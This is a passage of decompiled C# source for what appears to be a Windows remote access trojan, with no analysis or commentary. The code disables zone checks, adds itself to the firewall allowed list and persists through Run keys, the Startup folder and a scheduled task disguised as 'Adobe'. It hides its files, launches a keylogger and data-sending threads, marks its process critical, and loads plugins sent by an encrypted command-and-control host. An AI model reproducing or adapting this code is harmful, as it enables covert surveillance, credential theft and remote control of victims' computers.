          enumerator = new ManagementObjectSearcher("root\\SecurityCenter" + Interaction.IIf(MyProject.Computer.Info.OSFullName.Contains("XP"), (object) "", (object) "2").ToString(), "SELECT * FROM AntiVirusProduct").Get().GetEnumerator();
          while (enumerator.MoveNext())
          {
            ManagementObject current = (ManagementObject) enumerator.Current;
            Left = Operators.CompareString(Left, string.Empty, false) != 0 ? Left + " | " + current["displayName"].ToString() : Left + current["displayName"].ToString();
          }
        }
        finally
        {
          if (enumerator != null)
            enumerator.Dispose();
        }
        str = Operators.CompareString(Left, string.Empty, false) == 0 ? "No Antivirus" : Left;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "No Antivirus";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private static string GetFirewall()
    {
      string str;
      try
      {
        string Left = string.Empty;
        ManagementObjectCollection.ManagementObjectEnumerator enumerator;
        try
        {
          enumerator = new ManagementObjectSearcher("root\\SecurityCenter" + Interaction.IIf(MyProject.Computer.Info.OSFullName.Contains("XP"), (object) "", (object) "2").ToString(), "SELECT * FROM FirewallProduct").Get().GetEnumerator();
          while (enumerator.MoveNext())
          {
            ManagementObject current = (ManagementObject) enumerator.Current;
            Left = Operators.CompareString(Left, string.Empty, false) != 0 ? Left + " | " + current["displayName"].ToString() : Left + current["displayName"].ToString();
          }
        }
        finally
        {
          if (enumerator != null)
            enumerator.Dispose();
        }
        str = Operators.CompareString(Left, string.Empty, false) == 0 ? "No Firewall" : Left;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "No Firewall";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void INS()
    {
      if (OK.Idr)
      {
        if (!OK.CompDir(OK.LO, new FileInfo(Interaction.Environ(OK.DR).ToLower() + "\\" + OK.EXE.ToLower())))
        {
          try
          {
            if (System.IO.File.Exists(Interaction.Environ(OK.DR) + "\\" + OK.EXE))
              System.IO.File.Delete(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
            try
            {
              if (OK.EXE.Contains("\\"))
              {
                string path = Interaction.Environ(OK.DR) + "\\" + Path.GetDirectoryName(OK.EXE);
                if (!Directory.Exists(path))
                  Directory.CreateDirectory(path);
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            FileStream fileStream = new FileStream(Interaction.Environ(OK.DR) + "\\" + OK.EXE, FileMode.CreateNew);
            byte[] numArray = System.IO.File.ReadAllBytes(OK.LO.FullName);
            byte[] array = numArray;
            int offset = 0;
            int length = numArray.Length;
            fileStream.Write(array, offset, length);
            fileStream.Flush();
            fileStream.Close();
            OK.LO = new FileInfo(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
            Process.Start(OK.LO.FullName);
            ProjectData.EndApp();
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            Exception ex2 = ex1;
            if (OK.MsgExc)
            {
              int num = (int) MessageBox.Show(ex2.ToString());
            }
            ProjectData.SetProjectError(ex2);
            ProjectData.EndApp();
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
      }
      try
      {
        Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("netsh firewall add allowedprogram \"" + OK.LO.FullName + "\" \"" + OK.LO.Name + "\" ENABLE", AppWinStyle.Hide, true, 5000);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      if (OK.Isu)
      {
        try
        {
          OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.ISUName, (object) ("\"" + OK.LO.FullName + "\" .."));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        try
        {
          OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.ISUName, (object) ("\"" + OK.LO.FullName + "\" .."));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (OK.IsF)
      {
        try
        {
          System.IO.File.Copy(OK.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.ISFName + ".exe", true);
          OK.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.ISFName + ".exe", FileMode.Open);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      OK.PastaArq = Application.ExecutablePath;
      if (OK.STask)
      {
        try
        {
          if (OK.Idr)
          {
            if (Operators.ConditionalCompareObjectEqual(OK.GTV(A.mtx + "_02", (object) ""), (object) null, false))
            {
              OK.STV(A.mtx + "_02", (object) OK.GenStr(8), RegistryValueKind.String);
              string path = Conversions.ToString(Operators.ConcatenateObject((object) (Interaction.Environ(OK.DR) + "\\"), OK.GTV(A.mtx + "_02", (object) "")));
              string fileName = Path.GetFileName(Application.ExecutablePath);
              Directory.CreateDirectory(path);
              System.IO.File.Copy(Application.ExecutablePath, path + "\\" + fileName);
              OK.PastaArq = path + "\\" + fileName;
            }
          }
          else
            OK.PastaArq = Application.ExecutablePath;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          OK.PastaArq = Application.ExecutablePath;
          ProjectData.ClearProjectError();
        }
        OK.Schtask("Adobe", OK.PastaArq);
      }
      if (!OK.ATT)
        return;
      try
      {
        Interaction.Shell("attrib +H +S \"" + Application.ExecutablePath + "\"", AppWinStyle.Hide, false, -1);
        Interaction.Shell("attrib +H +S \"" + OK.PastaArq + "\"", AppWinStyle.Hide, false, -1);
        Interaction.Shell("attrib +H +S \"" + Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.ISFName + ".exe\"", AppWinStyle.Hide, false, -1);
        Interaction.Shell("attrib +H +S \"" + OK.LO.FullName + "\"", AppWinStyle.Hide, false, -1);
        Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("attrib +H +S \"" + Interaction.Environ(OK.DR) + "\\"), OK.GTV(A.mtx + "_02", (object) "")), (object) "\\"), (object) Path.GetFileName(Application.ExecutablePath)), (object) "\"")), AppWinStyle.Hide, false, -1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ko()
    {
      if (OK.EXE.Contains("[BR]"))
        OK.EXE = OK.EXE.Replace("[BR]", "\\");
      if (Interaction.Command() != null)
      {
        try
        {
          OK.F.Registry.CurrentUser.SetValue("di", (object) "!");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      OK.INS();
      if (!OK.Idr)
      {
        OK.EXE = OK.LO.Name;
        OK.DR = OK.LO.Directory.Name;
      }
      new Thread(new ThreadStart(OK.RC), 1).Start();
      try
      {
        OK.kq = new kl();
        new Thread(new ThreadStart(OK.kq.WRK), 1).Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Operators.CompareString(OK.Em, "True", false) == 0)
        {
          OK.En = new Enviar();
          new Thread(new ThreadStart(OK.En.SEND), 1).Start();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num1 = 0;
      if (OK.BD)
      {
        try
        {
          SystemEvents.SessionEnding += (SessionEndingEventHandler) ((a0, a1) => OK.ED());
          OK.pr(1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      while (true)
      {
        Thread.Sleep(5000);
        int num2 = OK.Cn ? 1 : 0;
        Application.DoEvents();
        try
        {
          checked { ++num1; }
          if (num1 == 5)
          {
            try
            {
              Process.GetCurrentProcess().MinWorkingSet = (IntPtr) 1024;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
          try
          {
            string Left1;
            string Left2;
            if (Operators.CompareString(Left1, OK.ACT(), false) != 0)
            {
              Left1 = OK.ACT();
              OK.Send("act" + OK.Y + Left1 + OK.Y + Left2);
            }
            if (Operators.CompareString(Left2, OK.ram(), false) != 0)
            {
              Left2 = OK.ram();
              OK.Send("act" + OK.Y + Left1 + OK.Y + Left2);
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          if (OK.Isu)
          {
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(OK.F.Registry.CurrentUser.GetValue(OK.sf + "\\" + OK.ISUName, (object) "")), (object) ("\"" + OK.LO.FullName + "\" .."), false))
                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.ISUName, (object) ("\"" + OK.LO.FullName + "\" .."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(OK.F.Registry.LocalMachine.GetValue(OK.sf + "\\" + OK.ISUName, (object) "")), (object) ("\"" + OK.LO.FullName + "\" .."), false))
                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.ISUName, (object) ("\"" + OK.LO.FullName + "\" .."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        try
        {
          if (OK.STask)
            OK.Schtask("Adobe", OK.PastaArq);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          if (OK.STask)
          {
            if (!System.IO.File.Exists(OK.PastaArq))
            {
              Directory.CreateDirectory(Path.GetDirectoryName(OK.PastaArq));
              System.IO.File.Copy(Application.ExecutablePath, OK.PastaArq);
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static string md5(byte[] B)
    {
      B = new SHA1CryptoServiceProvider().ComputeHash(B);
      string str = "";
      byte[] numArray = B;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        str += num.ToString("x2");
        checked { ++index; }
      }
      return str;
    }

    [DllImport("ntdll")]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

    public static object Plugin(byte[] b, string c)
    {
      Module[] modules = Assembly.Load(b).GetModules();
      int index1 = 0;
      object obj;
      while (index1 < modules.Length)
      {
        Module module = modules[index1];
        System.Type[] types = module.GetTypes();
        int index2 = 0;
        while (index2 < types.Length)
        {
          System.Type type = types[index2];
          if (type.FullName.EndsWith("." + c))
          {
            obj = module.Assembly.CreateInstance(type.FullName);
            goto label_9;
          }
          else
            checked { ++index2; }
        }
        checked { ++index1; }
      }
      obj = (object) null;
label_9:
      return obj;
    }

    public static void pr(int i)
    {
      try
      {
        OK.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public static void RC()
    {
      while (true)
      {
        OK.lastcap = "";
        if (OK.C != null)
        {
          long num1 = -1;
          int num2 = 0;
          try
          {
            while (true)
            {
              do
              {
                checked { ++num2; }
                if (num2 == 10)
                {
                  num2 = 0;
                  Thread.Sleep(1);
                }
                if (OK.Cn)
                {
                  if (OK.C.Available < 1)
                    OK.C.Client.Poll(-1, SelectMode.SelectRead);
                  do
                  {
                    if (OK.C.Available > 0)
                    {
                      if (num1 == -1L)
                      {
                        string str = "";
                        while (true)
                        {
                          int CharCode = OK.C.GetStream().ReadByte();
                          switch (CharCode)
                          {
                            case -1:
                              goto label_20;
                            case 0:
                              goto label_11;
                            default:
                              str += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                              continue;
                          }
                        }
label_11:
                        num1 = Conversions.ToLong(str);
                        if (num1 == 0L)
                        {
                          OK.Send("");
                          num1 = -1L;
                        }
                      }
                      else
                        goto label_15;
                    }
                    else
                      goto label_20;
                  }
                  while (OK.C.Available > 0);
                  continue;
label_15:
                  OK.b = new byte[checked (OK.C.Available + 1 - 1 + 1)];
                  long num3 = checked (num1 - OK.MeM.Length);
                  if ((long) OK.b.Length > num3)
                    OK.b = new byte[checked ((int) (num3 - 1L) + 1 - 1 + 1)];
                  int count = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None);
                  OK.MeM.Write(OK.b, 0, count);
                }
                else
                  goto label_20;
              }
              while (OK.MeM.Length != num1);
              num1 = -1L;
              Thread thread = new Thread((ParameterizedThreadStart) (a0 => OK.Ind((byte[]) a0)), 1);
              byte[] array = OK.MeM.ToArray();
              thread.Start((object) array);
              int millisecondsTimeout = 100;
              thread.Join(millisecondsTimeout);
              OK.MeM.Dispose();
              OK.MeM = new MemoryStream();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
label_20:
        do
        {
          try
          {
            if (OK.PLG != null)
            {
              NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "clear", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              OK.PLG = (object) null;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
          OK.Cn = false;
        }
        while (!OK.connect());
        OK.Cn = true;
      }
    }

    public static bool Send(string S)
    {
      return OK.Sendb(OK.SB(ref S));
    }

    public static bool Sendb(byte[] b)
    {
      bool flag;
      if (!OK.Cn)
      {
        flag = false;
      }
      else
      {
        try
        {
          lock ((object) OK.LO)
          {
            if (!OK.Cn)
            {
              flag = false;
              goto label_13;
            }
            else
            {
              MemoryStream local_2 = new MemoryStream();
              string local_5 = b.Length.ToString() + "\0";
              byte[] local_4 = OK.SB(ref local_5);
              local_2.Write(local_4, 0, local_4.Length);
              local_2.Write(b, 0, b.Length);
              OK.C.Client.Send(local_2.ToArray(), 0, checked ((int) local_2.Length), SocketFlags.None);
            }
          }
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          ProjectData.SetProjectError(ex1);
          try
          {
            if (OK.Cn)
            {
              OK.Cn = false;
              OK.C.Close();
            }
          }
          catch (Exception ex2)
          {
            ProjectData.SetProjectError(ex2);
            ProjectData.SetProjectError(ex2);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        flag = OK.Cn;
      }
label_13:
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void UNS()
    {
      OK.pr(0);
      OK.Isu = false;
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).DeleteValue(OK.ISUName, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).DeleteValue(OK.ISUName, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("netsh firewall delete allowedprogram \"" + OK.LO.FullName + "\"", AppWinStyle.Hide, false, -1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        if (OK.FS != null)
        {
          OK.FS.Dispose();
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.ISFName + ".exe");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(OK.ISUName, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + OK.LO.FullName + "\"", AppWinStyle.Hide, false, -1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      OK.del_Schtask("Adobe");
      try
      {
        if (System.IO.File.Exists(OK.PastaArq))
          System.IO.File.Delete(OK.PastaArq);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(OK.RG);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      ProjectData.EndApp();
    }

    public static object GTV(string n, object ret)
    {
      object objectValue;
      try
      {
        objectValue = RuntimeHelpers.GetObjectValue(OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG).GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        objectValue = RuntimeHelpers.GetObjectValue(ret);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return objectValue;
    }

    public static bool STV(string n, object t, RegistryValueKind typ)
    {
      bool flag;
      try
      {
        OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG).SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t)), typ);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static void DLV(string n)
    {
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG, true).DeleteValue(n);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public static byte[] ZIP(byte[] B)
    {
      MemoryStream memoryStream = new MemoryStream(B);
      GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
      byte[] buffer = new byte[4];
      memoryStream.Position = checked (memoryStream.Length - 5L);
      memoryStream.Read(buffer, 0, 4);
      int int32 = BitConverter.ToInt32(buffer, 0);
      memoryStream.Position = 0L;
      byte[] array = new byte[checked (int32 - 1 + 1 - 1 + 1)];
      gzipStream.Read(array, 0, int32);
      gzipStream.Dispose();
      memoryStream.Dispose();
      return array;
    }

    private static string d(string k, string t)
    {
      TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider();
      cryptoServiceProvider.Key = OK.th(k, cryptoServiceProvider.KeySize / 8);
      cryptoServiceProvider.IV = OK.th("", cryptoServiceProvider.BlockSize / 8);
      byte[] numArray = Convert.FromBase64String(t);
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write);
      byte[] buffer = numArray;
      int offset = 0;
      int length = numArray.Length;
      cryptoStream.Write(buffer, offset, length);
      cryptoStream.FlushFinalBlock();
      return OK.enc.GetString(memoryStream.ToArray());
    }

    private static byte[] th(string k, int i)
    {
      return (byte[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) new SHA1CryptoServiceProvider().ComputeHash(OK.enc.GetBytes(k)), (Array) new byte[checked (i - 1 + 1)]);
    }

    public static string DEB(ref string s)
    {
      byte[] B = Convert.FromBase64String(s);
      return OK.BS(ref B);
    }

    public static string ENB(ref string s)
    {
      return Convert.ToBase64String(OK.SB(ref s));
    }

    public static string BS(ref byte[] B)
    {
      return OK.Encoding.GetString(B);
    }

    public static byte[] SB(ref string S)
    {
      return OK.Encoding.GetBytes(S);
    }

    public static bool Cam()
    {
      bool flag;
      try
      {
        int num1 = 0;
        do
        {
          string str1 = (string) null;
          int num2 = (int) checked ((short) num1);
          string str2 = Strings.Space(100);
          // ISSUE: explicit reference operation
          // ISSUE: variable of a reference type
          string& lpszName = @str2;
          int cbName = 100;
          // ISSUE: explicit reference operation
          // ISSUE: variable of a reference type
          string& lpszVer = @str1;
          int cbVer = 100;
          if (OK.capGetDriverDescriptionA((short) num2, lpszName, cbName, lpszVer, cbVer))
          {
            flag = true;
            goto label_6;
          }
          else
            checked { ++num1; }
        }
        while (num1 <= 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      flag = false;
label_6:
      return flag;
    }

    public static string HWD()
    {
      string str;
      try
      {
        string lpVolumeNameBuffer = (string) null;
        int lpMaximumComponentLength = 0;
        int lpFileSystemFlags = 0;
        string lpFileSystemNameBuffer = (string) null;
        string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
        int lpVolumeSerialNumber;
        OK.GetVolumeInformation(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
        str = Conversion.Hex(lpVolumeSerialNumber);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str = "ERR";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private static void msgbox(string str1, string str2, string str3, string str4)
    {
      try
      {
        MessageBoxIcon messageBoxIcon;
        if (Operators.CompareString(str3, "info", false) == 0)
          messageBoxIcon = MessageBoxIcon.Asterisk;
        if (Operators.CompareString(str3, "help", false) == 0)
          messageBoxIcon = MessageBoxIcon.Question;
        if (Operators.CompareString(str3, "excla", false) == 0)
          messageBoxIcon = MessageBoxIcon.Exclamation;
        if (Operators.CompareString(str3, "crit", false) == 0)
          messageBoxIcon = MessageBoxIcon.Hand;
        if (Operators.CompareString(str3, "none", false) == 0)
          messageBoxIcon = MessageBoxIcon.None;
        MessageBoxButtons messageBoxButtons;
        if (Operators.CompareString(str4, "OK", false) == 0)
          messageBoxButtons = MessageBoxButtons.OK;
        if (Operators.CompareString(str4, "OKCancel", false) == 0)
          messageBoxButtons = MessageBoxButtons.OKCancel;
        if (Operators.CompareString(str4, "YesNo", false) == 0)
          messageBoxButtons = MessageBoxButtons.YesNo;
        if (Operators.CompareString(str4, "YesNoCancel", false) == 0)
          messageBoxButtons = MessageBoxButtons.YesNoCancel;
        Form form = new Form();
        form.TopMost = true;
        string text = Convert.ToString(str1);
        string caption = Convert.ToString(str2);
        int num1 = (int) messageBoxButtons;
        int num2 = (int) messageBoxIcon;
        int num3 = (int) MessageBox.Show((IWin32Window) form, text, caption, (MessageBoxButtons) num1, (MessageBoxIcon) num2);
        NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void notes(string str)
    {
      try
      {
        OK.STV(OK.nt, (object) str, RegistryValueKind.String);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static string notesmsg()
    {
      string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV(OK.nt, (object) "")));
      return OK.DEB(ref s);
    }

    private static void Schtask(string Nome, string PastaArq)
    {
      try
      {
        Interaction.Shell("schtasks /Create /SC minute /MO 1 /TN \"" + Nome + "\" /TR \"" + PastaArq + " ..\" /F", AppWinStyle.Hide, false, -1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void del_Schtask(string Nome)
    {
      try
      {
        Interaction.Shell("schtasks /delete /TN \"" + Nome + "\" /F", AppWinStyle.Hide, false, -1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static string GenStr(int lenght)
    {
      VBMath.Randomize();
      StringBuilder stringBuilder = new StringBuilder("");
      char[] charArray = "A0B1C2D3E4F5G6H7I8J9KLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
      int num1 = lenght;
      int num2 = 1;
      while (num2 <= num1)
      {
        VBMath.Randomize();
        int index = checked ((int) Math.Round(unchecked ((double) Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1.0)));
        stringBuilder.Append(charArray[index]);
        checked { ++num2; }
      }
      return stringBuilder.ToString();
    }

    protected static string HOST()
    {
      return !OK.EncHP ? OK.h : OK.d(OK.Kx, OK.h);
    }

    protected static string P()
    {
      return !OK.EncHP ? OK.Prt : OK.d(OK.Kx, OK.Prt);
    }
  }
}
